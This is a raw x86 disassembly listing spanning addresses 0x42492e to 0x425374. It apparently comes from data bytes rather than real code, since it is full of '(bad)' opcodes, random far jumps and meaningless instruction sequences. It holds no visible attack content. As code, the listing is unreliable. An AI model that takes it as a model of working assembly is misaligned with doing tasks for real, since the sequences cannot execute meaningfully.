  42492e:	idiv   BYTE PTR [ebx]
  424930:	sbb    BYTE PTR [edi+eiz*4+0xb60c],0x0
	...
  424994:	add    BYTE PTR [eax],al
  424996:	imul   ebx,DWORD PTR [eax],0x63
  424999:	push   0x73
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0x2695bac2
  4249a4:	mov    al,0x98
  4249a6:	retf   
  4249a7:	test   DWORD PTR [ecx],eax
  4249a9:	add    BYTE PTR [edi],al
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    BYTE PTR [esi-0x25],ch
  4249b0:	cmp    eax,0xb869bbf9
  4249b5:	loope  0x4249ab
  4249b7:	scas   eax,DWORD PTR es:[edi]
  4249b8:	retf   0x2199
  4249bb:	xor    dl,BYTE PTR [ebx+ebp*1]
  4249be:	lea    ebx,[edx]
  4249c0:	adc    BYTE PTR [edi+0x176756ab],dl
  4249c6:	mov    BYTE PTR [edi],ch
  4249c8:	in     al,dx
  4249c9:	repnz neg BYTE PTR [eax-0x3f666f1f]
  4249d0:	or     BYTE PTR [esi],ah
  4249d2:	fbstp  TBYTE PTR [eax]
  4249d4:	dec    ecx
  4249d5:	rcr    esi,1
  4249d7:	push   ss
  4249d8:	mov    dh,0xb6
  4249da:	push   es
  4249db:	cwde   
  4249dc:	cmp    bl,bl
  4249de:	cld    
  4249df:	clc    
  4249e0:	sub    DWORD PTR [edi+eiz*1+0x58014e24],edi
  4249e7:	xchg   ebx,eax
  4249e8:	call   0xc7f:0x1886aa42
  4249ef:	adc    BYTE PTR [ecx],ah
  4249f1:	jo     0x4249e3
  4249f3:	sahf   
  4249f4:	or     bh,cl
  4249f6:	sbb    DWORD PTR [esi-0x5dd0223c],esp
  4249fc:	xor    DWORD PTR [ebx-0x27],ebp
  4249ff:	outs   dx,BYTE PTR ds:[esi]
  424a01:	outs   dx,BYTE PTR ds:[esi]
  424a02:	xchg   ebp,eax
  424a03:	dec    edi
  424a04:	and    esi,DWORD PTR [ecx-0x4b748dff]
  424a0a:	bound  edi,QWORD PTR [ebp+eax*4-0x738b9c4f]
  424a11:	dec    edx
  424a12:	add    al,0x55
  424a14:	jle    0x424a2d
  424a16:	loope  0x4249a9
  424a18:	push   ebp
  424a19:	clc    
  424a1a:	adc    BYTE PTR [edi],bh
  424a1c:	stc    
  424a1d:	int3   
  424a1e:	inc    ecx
  424a1f:	call   0x440b:0x9e757e9f
  424a26:	fcmovnbe st,st(3)
  424a28:	popf   
  424a29:	pop    ecx
  424a2a:	mov    al,0x58
  424a2c:	ds (bad) 
  424a2e:	jnp    0x424aa5
  424a30:	sbb    eax,DWORD PTR [ecx]
  424a32:	pop    eax
  424a33:	sbb    eax,DWORD PTR [edi-0x46]
  424a36:	adc    cl,BYTE PTR [ebx]
  424a38:	dec    ebp
  424a39:	retf   0xa8de
  424a3c:	xchg   ecx,eax
  424a3d:	fs mov ecx,0x1b0e8828
  424a43:	pop    esp
  424a44:	cwde   
  424a45:	outs   dx,BYTE PTR ds:[esi]
  424a46:	mov    esp,0xc53fde33
  424a4b:	jo     0x424a4c
  424a4d:	or     BYTE PTR [ebp+0x48e173e3],dl
  424a53:	push   ecx
  424a54:	(bad)  
  424a55:	mov    bh,0x96
  424a57:	jg     0x424ad1
  424a59:	add    esi,ecx
  424a5b:	and    eax,0x628b79c4
  424a60:	sub    BYTE PTR [edx+eax*4],0x2c
  424a64:	xchg   DWORD PTR [eax-0x4c13db1f],edx
  424a6a:	(bad)  
  424a6b:	cmp    eax,0x1df68750
  424a70:	mov    esp,0x37653d5c
  424a75:	xor    DWORD PTR [edx-0x7a],esi
  424a78:	ins    DWORD PTR es:[edi],dx
  424a79:	dec    edx
  424a7a:	jnp    0x424a6c
  424a7c:	(bad)  
  424a7d:	jae    0x424af5
  424a7f:	idiv   BYTE PTR [esi-0x4beba567]
  424a85:	in     eax,0x5a
  424a87:	sahf   
  424a88:	xor    eax,DWORD PTR [ebx+0x64]
  424a8b:	xchg   ecx,eax
  424a8c:	mov    esp,ecx
  424a8e:	pop    edx
  424a8f:	lods   eax,DWORD PTR ds:[esi]
  424a90:	stos   BYTE PTR es:[edi],al
  424a91:	sub    edx,ebp
  424a93:	jl     0x424aee
  424a95:	out    dx,eax
  424a96:	sbb    ch,ch
  424a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a99:	dec    ecx
  424a9a:	sti    
  424a9b:	jge    0x424a56
  424a9d:	test   al,0xfc
  424a9f:	call   0xb66c:0xf4dbffaa
  424aa6:	mov    ebx,0x73a470d3
  424aab:	add    BYTE PTR ds:0xe5696bb2,bl
  424ab1:	push   edx
  424ab2:	mov    esi,0xa014
	...
  424b13:	add    BYTE PTR [eax],al
  424b15:	add    BYTE PTR [esi],al
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	aas    
  424b23:	iret   
  424b24:	dec    ebp
  424b25:	aad    0xd2
  424b27:	xchg   BYTE PTR [ecx],al
  424b29:	add    BYTE PTR [edi],al
  424b2b:	add    DWORD PTR [eax],eax
  424b2d:	add    BYTE PTR [edi],bl
  424b2f:	jbe    0x424b32
  424b31:	inc    eax
  424b32:	mov    esi,0x3a0b5a33
  424b37:	or     eax,0x584dffb5
  424b3c:	fcmovu st,st(6)
  424b3e:	xchg   edi,eax
  424b3f:	xchg   esi,eax
  424b40:	ins    BYTE PTR es:[edi],dx
  424b41:	mov    ds:0x530373bd,al
  424b46:	xor    al,0x72
  424b48:	add    eax,0xc18a046b
  424b4d:	jle    0x424b34
  424b4f:	push   esi
  424b50:	mov    esp,0x4e3d051a
  424b55:	mov    al,ds:0xeddbfa26
  424b5a:	hlt    
  424b5b:	or     eax,0x21d54316
  424b60:	mov    esp,0xf62c6c15
  424b65:	sar    DWORD PTR [esi-0x14e290b7],0x6e
  424b6c:	push   eax
  424b6d:	in     eax,dx
  424b6e:	or     esi,0x60
  424b71:	daa    
  424b72:	xor    edx,edi
  424b74:	leave  
  424b75:	mov    ds:0xd56a6e2f,eax
  424b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b7b:	call   0xec465a0
  424b80:	xchg   ebx,eax
  424b81:	pop    edi
  424b82:	push   edx
  424b83:	repnz aas 
  424b85:	aaa    
  424b86:	mov    ds:0xdda847f4,eax
  424b8b:	sub    al,0x4b
  424b8d:	ins    BYTE PTR es:[edi],dx
  424b8e:	xlat   BYTE PTR ds:[ebx]
  424b8f:	inc    edi
  424b90:	outs   dx,DWORD PTR ds:[esi]
  424b91:	adc    BYTE PTR [edx+0x2965bbe7],dl
  424b97:	xchg   DWORD PTR [ecx],ecx
  424b99:	idiv   ch
  424b9b:	inc    ebx
  424b9c:	dec    ecx
  424b9d:	xchg   edi,eax
  424b9e:	adc    DWORD PTR [eax-0x6889be51],ebp
  424ba4:	inc    ebx
  424ba5:	mov    esi,0xa8b04b09
  424baa:	xchg   edx,eax
  424bab:	test   BYTE PTR [edi],al
  424bad:	jmp    0x1f398f2c
  424bb2:	xchg   ebp,eax
  424bb3:	loope  0x424c31
  424bb5:	cli    
  424bb6:	daa    
  424bb7:	fcomp  QWORD PTR [edx+0x437bc84c]
  424bbd:	mov    DWORD PTR [ebx+0x7a],edi
  424bc0:	push   esi
  424bc1:	xor    ebx,DWORD PTR [eax]
  424bc3:	cwde   
  424bc4:	outs   dx,BYTE PTR ds:[esi]
  424bc5:	cmp    al,0x6c
  424bc7:	push   edx
  424bc8:	je     0x424b52
  424bca:	shr    DWORD PTR [eax+0x5],cl
  424bcd:	mov    ds:0x140f1de7,al
  424bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bd3:	cmp    DWORD PTR [ebp+0x3f1d0b45],ebx
  424bd9:	xchg   ebx,eax
  424bda:	lods   al,BYTE PTR ds:[esi]
  424bdb:	sub    eax,0x8ac27e2b
  424be0:	push   ebx
  424be1:	adc    edi,edi
  424be3:	shl    BYTE PTR [ebx-0x4ee2a117],cl
  424be9:	pop    ds
  424bea:	into   
  424beb:	jne    0x424bc9
  424bed:	jle    0x424ba2
  424bef:	mov    ds:0x34b82672,eax
  424bf4:	ret    0xc504
  424bf7:	aaa    
  424bf8:	cmp    al,0xcb
  424bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bfb:	das    
  424bfc:	xor    DWORD PTR [edi-0x786dcd19],0xceb11839
  424c06:	push   esi
  424c07:	out    0x11,eax
  424c09:	sbb    eax,0xa0c5d7b5
  424c0e:	jno    0x424bfd
  424c10:	fidiv  DWORD PTR [ebx]
  424c12:	adc    bl,dl
  424c14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c15:	outs   dx,DWORD PTR ds:[esi]
  424c16:	sahf   
  424c17:	pop    esi
  424c18:	daa    
  424c19:	fdivr  st,st(0)
  424c1b:	mov    esp,0xa0e34b17
  424c20:	in     al,0x34
  424c22:	enter  0xb971,0xef
  424c26:	inc    esi
  424c27:	push   ss
  424c28:	push   ebp
  424c29:	dec    ecx
  424c2a:	cmp    esp,DWORD PTR [ebp-0x79e5774e]
  424c30:	fdivr  DWORD PTR [esi+0xe2057e]
	...
  424c96:	ins    BYTE PTR es:[edi],dx
  424c97:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424c9e:	sub    eax,0x2b588c09
  424ca3:	addr16 jne 0x424c6f
  424ca6:	fld    DWORD PTR [edi+0x1070001]
  424cac:	add    BYTE PTR [eax],al
  424cae:	mov    BYTE PTR [esi],dh
  424cb0:	nop
  424cb1:	mov    dl,BYTE PTR [eax+0x6b]
  424cb4:	(bad)  [esi+0x69a8c96b]
  424cba:	stos   DWORD PTR es:[edi],eax
  424cbb:	es loope 0x424c7a
  424cbe:	ins    DWORD PTR es:[edi],dx
  424cbf:	xor    ebp,DWORD PTR [eax]
  424cc1:	push   eax
  424cc2:	mov    al,dh
  424cc4:	jno    0x424cc0
  424cc6:	sar    DWORD PTR ds:0x8555ae93,0x3f
  424ccd:	cdq    
  424cce:	mov    dl,0x54
  424cd0:	ret    
  424cd1:	push   esi
  424cd2:	or     al,0xcc
  424cd4:	and    bl,BYTE PTR [ebx]
  424cd6:	push   ecx
  424cd7:	push   ebp
  424cd8:	mov    ah,0x59
  424cda:	out    dx,eax
  424cdb:	sub    BYTE PTR [ecx+edx*1+0x2e28bda1],ch
  424ce2:	mov    bh,0xfc
  424ce4:	imul   esp,DWORD PTR [edx],0x97f3d9cb
  424cea:	mov    esp,0xc1376508
  424cef:	sbb    eax,0x73cc73ca
  424cf4:	int    0xb9
  424cf6:	lods   al,BYTE PTR ds:[esi]
  424cf7:	lds    eax,FWORD PTR [ebx+0x13efaf25]
  424cfd:	call   0x738e:0x594f224f
  424d04:	(bad)
  424d07:	sbb    eax,0xb8b5bd01
  424d0c:	rcl    DWORD PTR ds:0x48ffff15,0xef
  424d13:	mov    bh,0x2c
  424d15:	aad    0x7a
  424d17:	(bad)  
  424d18:	aad    0xb0
  424d1a:	addr16 and al,0x70
  424d1d:	cmp    ebx,esi
  424d1f:	call   0xd0cd41
  424d24:	and    DWORD PTR [ecx+0x76eb6b54],ebp
  424d2a:	pusha  
  424d2b:	push   edx
  424d2c:	stos   BYTE PTR es:[edi],al
  424d2d:	mov    ds:0x69817b,al
  424d32:	xor    BYTE PTR [ebx+0x476fa115],ch
  424d38:	mov    ds:0xd4eff8f5,al
  424d3d:	jecxz  0x424d53
  424d3f:	shl    BYTE PTR [ebx-0x4e],1
  424d42:	std    
  424d43:	sar    BYTE PTR [ebp-0x2293ee02],cl
  424d49:	and    eax,0xac20c9b3
  424d4e:	sub    BYTE PTR [ebp-0x2f],ch
  424d51:	mov    ebp,0x9eba564e
  424d56:	in     al,0x16
  424d58:	adc    eax,0xbaa201e
  424d5d:	stos   BYTE PTR es:[edi],al
  424d5e:	or     al,BYTE PTR [ecx]
  424d60:	into   
  424d61:	mov    ch,0x4d
  424d63:	push   ecx
  424d64:	inc    esp
  424d65:	push   ecx
  424d66:	aas    
  424d67:	rcr    BYTE PTR [eax],cl
  424d69:	repnz adc DWORD PTR [esp+edx*4-0x3d],esp
  424d6e:	xor    eax,0x30d5c57b
  424d73:	into   
  424d74:	push   edi
  424d75:	jbe    0x424d2e
  424d77:	cmp    DWORD PTR [ebx-0x26],edi
  424d7a:	mov    fs,WORD PTR ds:0x61ba6694
  424d80:	cmp    dh,dl
  424d82:	outs   dx,BYTE PTR ds:[esi]
  424d83:	call   0xb883cd7
  424d88:	add    BYTE PTR [edx+0x1c],cl
  424d8b:	and    eax,0x839dba48
  424d90:	cmp    eax,0x39d607cd
  424d95:	out    dx,al
  424d96:	clc    
  424d97:	fst    QWORD PTR [esi-0x2b]
  424d9a:	sub    cl,BYTE PTR [ecx]
  424d9c:	sbb    ebp,DWORD PTR [ebp+esi*8+0x4c]
  424da0:	jl     0x424dc4
  424da2:	xchg   ecx,eax
  424da3:	stos   BYTE PTR es:[edi],al
  424da4:	xchg   edi,eax
  424da5:	int3   
  424da6:	or     DWORD PTR [ebp+0x45],0x85d4df03
  424dad:	js     0x424df0
  424daf:	cmp    al,0xa2
  424db1:	push   ecx
  424db2:	fisttp DWORD PTR [esi-0x6b]
	...
  424e15:	add    BYTE PTR ds:0xf361d20c,bh
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   DWORD PTR [edx],ecx
  424e23:	popf   
  424e24:	pop    esi
  424e25:	and    al,0x88
  424e28:	add    DWORD PTR [eax],eax
  424e2a:	pop    es
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    cl,cl
  424e2f:	int3   
  424e30:	test   DWORD PTR [ebx-0xb15cecc],esi
  424e36:	mov    ebx,0x424898e6
  424e3b:	neg    esi
  424e3d:	sub    cl,bh
  424e3f:	mov    bh,0x16
  424e41:	ins    BYTE PTR es:[edi],dx
  424e42:	jne    0x424e6a
  424e44:	or     edx,DWORD PTR [esi]
  424e46:	fxtract 
  424e48:	test   al,0x54
  424e4a:	xchg   esi,eax
  424e4b:	jle    0x424dd5
  424e4d:	ficomp DWORD PTR [eax+eax*2-0x10]
  424e51:	mov    ds:0x52271875,al
  424e56:	xlat   BYTE PTR ds:[ebx]
  424e57:	hlt    
  424e58:	pop    edx
  424e59:	enter  0x6e81,0x83
  424e5d:	loopne 0x424ddf
  424e5f:	and    eax,0xe4351b4a
  424e64:	pop    edx
  424e65:	dec    BYTE PTR [edx-0x80]
  424e68:	sbb    BYTE PTR [esi-0x6b9f824f],bl
  424e6e:	inc    eax
  424e6f:	or     bl,BYTE PTR [ebp+0x36]
  424e72:	hlt    
  424e73:	add    esi,ebp
  424e75:	hlt    
  424e76:	lods   eax,DWORD PTR ds:[esi]
  424e77:	push   ebx
  424e78:	push   ebx
  424e79:	add    eax,0x1b523bc9
  424e7e:	(bad)  
  424e7f:	retf   0xdb94
  424e82:	cmp    al,0xd9
  424e84:	xchg   ecx,eax
  424e85:	sub    BYTE PTR [edx+0x2a],cl
  424e88:	ins    BYTE PTR es:[edi],dx
  424e89:	mov    ecx,0x268dcd5d
  424e8e:	or     al,0xe3
  424e90:	add    esp,DWORD PTR [edx-0x61f1b60d]
  424e96:	push   edx
  424e97:	int3   
  424e98:	nop
  424e99:	push   ebx
  424e9a:	xchg   esi,eax
  424e9b:	fld    TBYTE PTR [edi+ebp*1+0x17]
  424e9f:	scas   al,BYTE PTR es:[edi]
  424ea0:	enter  0x7688,0xe5
  424ea4:	jnp    0x424f15
  424ea6:	xchg   DWORD PTR fs:[ebp-0xc],esp
  424eaa:	pop    es
  424eab:	pop    ebx
  424eac:	ja     0x424ef2
  424eae:	push   ebx
  424eaf:	cmc    
  424eb0:	jl     0x424e65
  424eb2:	sbb    DWORD PTR ds:0x3bd7b701,0xfffffffa
  424eb9:	repnz out 0xd3,eax
  424ebc:	addr16 dec ebx
  424ebe:	outs   dx,DWORD PTR ds:[esi]
  424ebf:	data16 int 0xdb
  424ec2:	pop    ebx
  424ec3:	or     al,0xcd
  424ec5:	cmp    eax,0x40e9be8d
  424eca:	dec    BYTE PTR [ebx+ebp*8]
  424ecd:	ret    0xf472
  424ed0:	push   ss
  424ed1:	out    dx,eax
  424ed2:	cmp    BYTE PTR [ebx],dl
  424ed4:	gs popf 
  424ed6:	inc    ebx
  424ed7:	mul    DWORD PTR ds:0xdf7580cf
  424edd:	pop    ebx
  424ede:	mov    dh,0xa1
  424ee0:	into   
  424ee1:	xor    ah,bh
  424ee3:	shr    bh,0x2d
  424ee6:	nop
  424ee7:	xlat   BYTE PTR fs:[ebx]
  424ee9:	dec    edi
  424eea:	push   edi
  424eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424eec:	iret   
  424eed:	rol    DWORD PTR [esi],1
  424eef:	sbb    al,0xa7
  424ef1:	xor    bl,BYTE PTR [ebp+0x62]
  424ef4:	ror    DWORD PTR [edx+0x3f],1
  424ef7:	fisub  WORD PTR [esi-0x5b]
  424efa:	mov    BYTE PTR [edx],bl
  424efc:	adc    cl,BYTE PTR [ebp+0x24681e63]
  424f02:	jg     0x424ecb
  424f04:	xchg   DWORD PTR [ebx-0x53],edx
  424f07:	repz in al,0x25
  424f0a:	mov    ds:0x11613b0a,al
  424f0f:	sbb    DWORD PTR [ebp+0x3d19250a],0xc3c9452d
  424f19:	mov    dl,BYTE PTR [edi]
  424f1b:	inc    esp
  424f1c:	xor    dh,BYTE PTR [ecx+0x45]
  424f1f:	popa   
  424f20:	inc    ecx
  424f21:	or     eax,0xd657f0d1
  424f26:	jecxz  0x424f37
  424f28:	jge    0x424f64
  424f2a:	loopne 0x424f20
  424f2c:	or     BYTE PTR [ecx+0x4513dcba],dh
  424f32:	and    ah,BYTE PTR [ebp+0x95]
	...
  424f94:	add    BYTE PTR [eax],al
  424f96:	dec    ebx
  424f97:	push   ss
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax+0x4e0e6e95],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    BYTE PTR [edi],dh
  424faf:	lahf   
  424fb0:	stos   DWORD PTR es:[edi],eax
  424fb1:	jecxz  0x425004
  424fb3:	or     BYTE PTR [edx],0x7d
  424fb6:	xor    eax,0x77b59010
  424fbb:	pop    edi
  424fbc:	jne    0x424f9e
  424fbe:	and    eax,0x7ad65b60
  424fc3:	add    bl,BYTE PTR [edx+esi*2-0x72f969e1]
  424fca:	mov    edi,0x86beed25
  424fcf:	sub    al,0xa7
  424fd1:	add    eax,0xcdaaf0fb
  424fd6:	mov    ds:0x96245a8a,eax
  424fdb:	sub    al,0x25
  424fdd:	xchg   esi,eax
  424fde:	jecxz  0x424fab
  424fe0:	jmp    ecx
  424fe2:	inc    ebx
  424fe3:	leave  
  424fe4:	and    BYTE PTR [edi+0x35],dh
  424fe7:	sti    
  424fe8:	add    eax,0xfbe2ba04
  424fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fee:	inc    DWORD PTR [ecx]
  424ff0:	sub    al,BYTE PTR [eax+edx*2-0x13e69135]
  424ff7:	push   0x55
  424ff9:	jb     0x42501b
  424ffb:	xchg   ebx,eax
  424ffc:	test   al,0xa0
  424ffe:	cli    
  424fff:	cli    
  425000:	pusha  
  425001:	sti    
  425002:	cmp    ebp,DWORD PTR [esi]
  425004:	int3   
  425005:	fbstp  TBYTE PTR [edx]
  425007:	jge    0x424f9e
  425009:	scas   eax,DWORD PTR es:[edi]
  42500a:	inc    edi
  42500b:	into   
  42500c:	pop    ss
  42500d:	cli    
  42500e:	add    DWORD PTR ds:0x29aa5631,esp
  425014:	sbb    al,0xb2
  425016:	loope  0x424fb1
  425018:	xchg   ebx,eax
  425019:	xor    BYTE PTR [eax+0x51],dl
  42501c:	or     DWORD PTR [ecx-0x317757d9],esi
  425022:	les    esp,FWORD PTR [edi+edx*4-0x4f40955b]
  425029:	jecxz  0x424fcd
  42502b:	pusha  
  42502c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42502d:	cld    
  42502e:	ficom  DWORD PTR [edx+esi*1]
  425031:	lds    esp,FWORD PTR [edi+edx*4]
  425034:	push   edi
  425035:	sub    ah,BYTE PTR [ebp-0x2a3148e0]
  42503b:	mov    esi,0x9587c494
  425040:	inc    ebp
  425041:	and    eax,0x1be4c81d
  425046:	jnp    0x425062
  425048:	stos   BYTE PTR es:[edi],al
  425049:	jl     0x42503b
  42504b:	(bad)  
  42504d:	cmp    eax,0x9efc1d38
  425052:	sub    DWORD PTR fs:[esi-0x7c],ebx
  425056:	cmp    al,0x94
  425058:	pop    edx
  425059:	dec    ecx
  42505a:	mov    ds:0xcecc0953,eax
  42505f:	mov    dh,0xf6
  425061:	jmp    0x41e8:0x90a77cb7
  425068:	aas    
  425069:	xchg   esi,eax
  42506a:	imul   ebp,DWORD PTR [ebx+0x7e7005b6],0x48
  425071:	inc    ecx
  425072:	pop    ecx
  425073:	sbb    DWORD PTR [edi-0x3],0x4ce633c7
  42507a:	mov    edx,0xdd33ff90
  42507f:	dec    esi
  425080:	and    eax,0x5fec5534
  425085:	clc    
  425086:	jnp    0x42506a
  425088:	stos   DWORD PTR es:[edi],eax
  425089:	mov    edx,0xc5ee322d
  42508e:	shl    BYTE PTR [ebx],1
  425090:	enter  0xa87c,0x9d
  425094:	leave  
  425095:	pop    edx
  425096:	push   ds
  425097:	jb     0x4250c1
  425099:	xor    DWORD PTR ds:0xc1b68b2b,ebp
  42509f:	rcr    BYTE PTR [eax],cl
  4250a1:	push   0xa899d135
  4250a6:	and    BYTE PTR [ecx+0x45850ef],bh
  4250ac:	outs   dx,DWORD PTR ds:[esi]
  4250ad:	mov    esi,0x88e7a0ef
  4250b2:	lea    ebx,[esi]
  4250b4:	fiadd  DWORD PTR [eax]
	...
  425116:	ficom  WORD PTR [ecx]
  425118:	lahf   
  425119:	and    ebx,edi
  42511b:	scas   eax,DWORD PTR es:[edi]
  42511c:	(bad)  
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	shl    BYTE PTR [ebp+0x41],cl
  425124:	dec    ebp
  425125:	(bad)  
  425126:	out    dx,al
  425127:	mov    al,BYTE PTR [ecx]
  425129:	add    BYTE PTR [edi],al
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    BYTE PTR [edi],bh
  42512f:	jg     0x42510c
  425131:	out    0x6,al
  425133:	out    0xd8,eax
  425135:	jnp    0x4250b9
  425137:	cmp    BYTE PTR [ecx],al
  425139:	push   0xcb87cdb4
  42513e:	dec    ebp
  42513f:	add    esp,edx
  425141:	adc    al,0x68
  425143:	cmp    edi,ebx
  425145:	or     eax,0x7f2ccf9e
  42514a:	pop    ds
  42514b:	cdq    
  42514c:	mov    ds:0x2c45a98e,al
  425151:	rcl    DWORD PTR [ebp+0x6],1
  425154:	xchg   DWORD PTR [ebp-0x714e13b5],eax
  42515a:	fcomi  st,st(2)
  42515c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42515d:	ret    
  42515e:	(bad)  
  42515f:	sub    dh,BYTE PTR [esi+eiz*8]
  425162:	clc    
  425163:	inc    edi
  425164:	xor    BYTE PTR [edi],ch
  425166:	popa   
  425167:	dec    edx
  425168:	sti    
  425169:	popf   
  42516a:	outs   dx,DWORD PTR ds:[esi]
  42516b:	retf   
  42516c:	cmovnp ebx,DWORD PTR [eax]
  42516f:	xchg   edx,eax
  425170:	jae    0x425151
  425172:	dec    ebp
  425173:	popf   
  425174:	aaa    
  425175:	hlt    
  425176:	jnp    0x425157
  425178:	jp     0x4251f6
  42517a:	fisub  WORD PTR [ecx+0x6a]
  42517d:	(bad)  
  42517e:	cmc    
  42517f:	std    
  425180:	in     eax,dx
  425181:	xchg   edx,eax
  425182:	stc    
  425183:	ret    0xd157
  425186:	and    al,0x82
  425188:	cmp    bl,bl
  42518a:	in     al,0x45
  42518c:	jmp    0xc302:0x9c8b6e9c
  425193:	jmp    0x239c:0xd80b26eb
  42519a:	xor    bl,BYTE PTR [ecx+0x1e]
  42519d:	xchg   esi,eax
  42519e:	add    DWORD PTR [ebx-0x2],edi
  4251a1:	iret   
  4251a2:	std    
  4251a3:	je     0x4251ba
  4251a5:	mov    esp,0xcdc5de9f
  4251aa:	out    0x27,eax
  4251ac:	xor    al,0x7f
  4251ae:	pop    ss
  4251af:	mov    edi,0x4df22c8
  4251b4:	mov    edx,es
  4251b6:	popa   
  4251b7:	imul   ecx,DWORD PTR [esi+esi*8-0x783f3fc2],0xfac56dfe
  4251c2:	mov    ecx,ecx
  4251c4:	js     0x42521b
  4251c6:	pop    ss
  4251c7:	(bad)  
  4251c9:	inc    esi
  4251ca:	adc    eax,0x2b5b51b8
  4251cf:	jb     0x4251a8
  4251d1:	jae    0x42524f
  4251d3:	adc    BYTE PTR [ebp+0x30],0x6e
  4251d7:	popa   
  4251d8:	add    al,0x39
  4251da:	in     al,dx
  4251db:	fidiv  DWORD PTR [esi]
  4251dd:	inc    esp
  4251de:	pop    ebp
  4251df:	add    ecx,DWORD PTR [eax+eax*1]
  4251e2:	sbb    bl,BYTE PTR [esi-0x34231e5d]
  4251e8:	sbb    DWORD PTR [ecx-0x6c0d9e42],esi
  4251ee:	jl     0x4251ca
  4251f0:	mov    ebx,0xdef33d50
  4251f5:	pop    eax
  4251f6:	pop    ecx
  4251f7:	in     eax,0x94
  4251f9:	lds    ebp,FWORD PTR [ebx+0x45]
  4251fc:	dec    ecx
  4251fd:	lds    esi,FWORD PTR [edx]
  4251ff:	loop   0x425181
  425201:	mov    cl,0xfc
  425203:	mov    edx,0x7827eef7
  425208:	jo     0x4251e6
  42520a:	outs   dx,BYTE PTR ds:[esi]
  42520b:	dec    esi
  42520c:	xor    ch,BYTE PTR [ecx+0x148ea5ac]
  425212:	mov    esi,DWORD PTR [esi+0x75]
  425215:	push   0x10
  425217:	leave  
  425218:	test   al,0x9b
  42521a:	cmovb  ebp,ebx
  42521d:	sbb    cl,BYTE PTR [esi+0x6b1857d1]
  425223:	jns    0x4251e5
  425225:	je     0x4251b2
  425227:	sub    edx,DWORD PTR [ecx+ecx*4+0x77a446ff]
  42522e:	push   ds
  42522f:	test   eax,0xb089ceec
  425234:	jp     0x425236
	...
  425296:	lods   al,BYTE PTR ds:[esi]
  425297:	les    esi,FWORD PTR [ebx-0x32]
  42529a:	jnp    0x42529b
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0x37105682
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    BYTE PTR [ebx-0x12173f79],cl
  4252b3:	jnp    0x425287
  4252b5:	add    BYTE PTR [ebp+0x351d9948],bh
  4252bb:	pusha  
  4252bc:	stos   DWORD PTR es:[edi],eax
  4252bd:	mov    al,0x81
  4252bf:	fdiv   QWORD PTR [edx+ebx*8+0x4a57e5a3]
  4252c6:	jnp    0x4252f0
  4252c8:	xor    ah,BYTE PTR [edx+eax*8+0x5b]
  4252cc:	xor    al,0xcc
  4252ce:	int    0x2d
  4252d0:	push   eax
  4252d1:	dec    esp
  4252d2:	sbb    al,0x8b
  4252d4:	and    al,0xa5
  4252d6:	mov    ds:0x3270f659,al
  4252db:	je     0x42530d
  4252dd:	mov    cl,0x8a
  4252df:	jmp    esp
  4252e1:	in     eax,dx
  4252e2:	and    BYTE PTR es:[edi+0x32],0x32
  4252e7:	faddp  st(4),st
  4252e9:	fdiv   DWORD PTR [ebp+ebp*1-0x45]
  4252ed:	retf   
  4252ee:	xbegin 0xbb1897e4
  4252f4:	shl    BYTE PTR [esi],cl
  4252f6:	dec    edx
  4252f7:	fs stos DWORD PTR es:[edi],eax
  4252f9:	jl     0x425347
  4252fb:	popa   
  4252fc:	pop    ss
  4252fd:	mov    esp,ebx
  4252ff:	push   es
  425300:	sbb    al,0xae
  425302:	pop    edi
  425303:	loopne 0x42528f
  425305:	stos   DWORD PTR es:[edi],eax
  425306:	sbb    DWORD PTR [esp+eax*2+0x466b4211],0x31b1135c
  425311:	ja     0x4252d5
  425313:	out    dx,eax
  425314:	sbb    DWORD PTR [edx],0xffffffe8
  425317:	fwait
  425318:	mov    edi,0x9a71e706
  42531d:	cli    
  42531e:	adc    cl,ah
  425320:	jl     0x4252c3
  425322:	je     0x42530b
  425324:	sbb    al,0xef
  425326:	mov    esi,0x3b25a47c
  42532b:	ret    
  42532c:	adc    BYTE PTR [ebx],al
  42532e:	or     DWORD PTR [esp+ebp*1-0x3c],0x2e
  425333:	adc    dh,BYTE PTR [ebp-0x4d0fc406]
  425339:	inc    ecx
  42533a:	jae    0x425349
  42533c:	and    esi,DWORD PTR [ebx-0x519be388]
  425342:	sbb    al,0x20
  425344:	mov    bh,0x37
  425346:	sub    eax,0x1fd41611
  42534b:	xchg   esp,eax
  42534c:	fbld   TBYTE PTR [esi]
  42534e:	lea    esp,[ebp-0x3b003697]
  425354:	xchg   ebp,eax
  425355:	or     bl,BYTE PTR [edi+edx*8+0x5dc41544]
  42535c:	mov    bh,0xe4
  42535e:	int3   
  42535f:	loope  0x425369
  425361:	inc    esi
  425362:	(bad)  
  425363:	popf   
  425364:	in     eax,dx
  425365:	xchg   esp,eax
  425366:	stos   BYTE PTR es:[edi],al
  425367:	popa   
  425368:	mov    eax,cs:0x500168ef
  42536e:	mov    BYTE PTR [ecx-0x312b9fa7],ah
  425374:	jnp    0x42533c
